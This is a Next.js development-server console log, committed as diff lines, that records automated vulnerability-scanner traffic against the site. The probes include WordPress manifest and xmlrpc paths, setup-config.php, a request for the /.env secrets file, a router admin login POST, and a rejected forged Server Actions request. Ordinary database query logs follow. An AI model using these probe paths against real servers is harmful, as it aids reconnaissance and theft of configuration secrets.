+ GET /news/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 2498ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 46ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 32ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 39ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 32ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 37ms
+ GET / 200 in 1462ms
+ GET / 200 in 475ms
+ GET / 200 in 268ms
+ ○ Compiling /api/auth/[...nextauth] ...
+ ✓ Compiled /api/auth/[...nextauth] in 6.9s (1747 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 7566ms
+ GET /api/auth/session 200 in 48ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 1156ms (2606 modules)
+ GET /wp-admin/setup-config.php 404 in 1478ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 59ms
+ ○ Compiling / ...
+ ✓ Compiled / in 7s (1432 modules)
+ GET / 200 in 8567ms
+ GET / 200 in 757ms
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 2.1s (1462 modules)
+ GET /favicon.ico 200 in 2378ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 5.6s (2606 modules)
+ GET /.env 404 in 6335ms
+ ○ Compiling / ...
+ ✓ Compiled / in 1609ms (1432 modules)
+ HEAD / 200 in 99ms
+ GET / 200 in 159ms
+ GET / 200 in 90ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 957ms (3003 modules)
+ GET /cdn-cgi/trace 404 in 1096ms
+ HEAD / 200 in 92ms
+ ✓ Compiled /favicon.ico in 330ms (1463 modules)
+ GET /favicon.ico 200 in 542ms
+ GET / 200 in 928ms
+ GET / 200 in 133ms
+ GET /wp-includes/wlwmanifest.xml 404 in 90ms
+ GET /xmlrpc.php?rsd 404 in 39ms
+ GET / 200 in 138ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 32ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 39ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 39ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 40ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 39ms
+ GET / 200 in 1267ms
+ GET / 200 in 416ms
+ GET /wp-includes/wlwmanifest.xml 404 in 156ms
+ GET /xmlrpc.php?rsd 404 in 58ms
+ GET / 200 in 223ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 74ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 53ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 49ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 111ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 37ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 31ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET / 200 in 662ms
+ POST / 200 in 117ms
+ POST / 200 in 146ms
+ GET /WuEL 404 in 214ms
+ GET /a 404 in 76ms
+ GET /download/file.ext 404 in 42ms
+ GET /SiteLoader 404 in 30ms
+ GET /mPlayer 404 in 29ms
+ POST / 200 in 80ms
+ GET / 200 in 1526ms
+ GET / 200 in 216ms
+`x-forwarded-host` header with value `77.37.124.229:80` does not match `origin` header with value `77.37.124.229` from a forwarded Server Actions request. Aborting the action.
+ ⨯ Error: Invalid Server Actions request.
+    at rS (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:38:7099)
+    at r4 (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:41:1262)
+    at /root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:726
+    at AsyncLocalStorage.run (node:async_hooks:346:14)
+    at Object.wrap (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:36:16615)
+    at /root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:616
+    at AsyncLocalStorage.run (node:async_hooks:346:14)
+    at Object.wrap (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:36:15721)
+    at r6 (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:543)
+    at np.render (/root/3gis-web/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:42:4661)
+    at doRender (/root/3gis-web/node_modules/next/dist/server/base-server.js:1418:44)
+    at cacheEntry.responseCache.get.routeKind (/root/3gis-web/node_modules/next/dist/server/base-server.js:1579:34)
+    at ResponseCache.get (/root/3gis-web/node_modules/next/dist/server/response-cache/index.js:49:26)
+    at DevServer.renderToResponseWithComponentsImpl (/root/3gis-web/node_modules/next/dist/server/base-server.js:1487:53)
+    at /root/3gis-web/node_modules/next/dist/server/base-server.js:998:121
+    at NextTracerImpl.trace (/root/3gis-web/node_modules/next/dist/server/lib/trace/tracer.js:105:20)
+    at DevServer.renderToResponseWithComponents (/root/3gis-web/node_modules/next/dist/server/base-server.js:998:41)
+    at DevServer.renderErrorToResponseImpl (/root/3gis-web/node_modules/next/dist/server/base-server.js:2169:35)
+    at async pipe.req.req (/root/3gis-web/node_modules/next/dist/server/base-server.js:2043:30)
+    at async DevServer.pipeImpl (/root/3gis-web/node_modules/next/dist/server/base-server.js:916:25)
+    at async /root/3gis-web/node_modules/next/dist/server/dev/next-dev-server.js:339:20
+    at async Span.traceAsyncFn (/root/3gis-web/node_modules/next/dist/trace/trace.js:154:20)
+    at async DevServer.handleRequest (/root/3gis-web/node_modules/next/dist/server/dev/next-dev-server.js:336:24)
+    at async invokeRender (/root/3gis-web/node_modules/next/dist/server/lib/router-server.js:173:21)
+    at async handleRequest (/root/3gis-web/node_modules/next/dist/server/lib/router-server.js:365:24)
+    at async requestHandlerImpl (/root/3gis-web/node_modules/next/dist/server/lib/router-server.js:374:13)
+    at async Server.requestListener (/root/3gis-web/node_modules/next/dist/server/lib/start-server.js:141:13)
+ ○ Compiling /_error ...
+ ✓ Compiled /_error in 6.7s (2608 modules)
+ POST /boaform/admin/formLogin 500 in 7425ms
+ ○ Compiling / ...
+ ✓ Compiled / in 1374ms (1432 modules)
+ GET / 200 in 2265ms
+ GET / 200 in 75ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 1062ms (3003 modules)
+ GET /wp-includes/wlwmanifest.xml 404 in 1256ms
+ GET /xmlrpc.php?rsd 404 in 36ms
+ GET / 200 in 128ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 42ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 37ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 41ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 40ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 37ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 30ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 35ms
+ GET / 200 in 1021ms
+ GET / 200 in 292ms
+ ○ Compiling /api/auth/[...nextauth] ...
+ ✓ Compiled /api/auth/[...nextauth] in 6.7s (1747 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET / 200 in 415ms
+   Reload env: .env
+ ✓ Compiled in 1456ms (2603 modules)
+ ✓ Compiled in 435ms (2603 modules)
+[?25h
+
+> 3gis@0.1.0 dev
+> next dev -p 3000
+
+  ▲ Next.js 14.2.7
+  - Local:        http://localhost:3000
+  - Environments: .env
+
+ ✓ Starting...
+ ✓ Ready in 1525ms
+ ○ Compiling /api/vehiclestest ...
+ ✓ Compiled /api/vehiclestest in 765ms (55 modules)
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 1083ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 100ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 99ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 89ms
+prisma:query SELECT 1
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 109ms
+prisma:query SELECT "public"."Obd_check"."id", "public"."Obd_check"."all", "public"."Obd_check"."createdAt" FROM "public"."Obd_check" WHERE 1=1 OFFSET $1
+ GET /api/vehiclestest 200 in 113ms
+[?25h
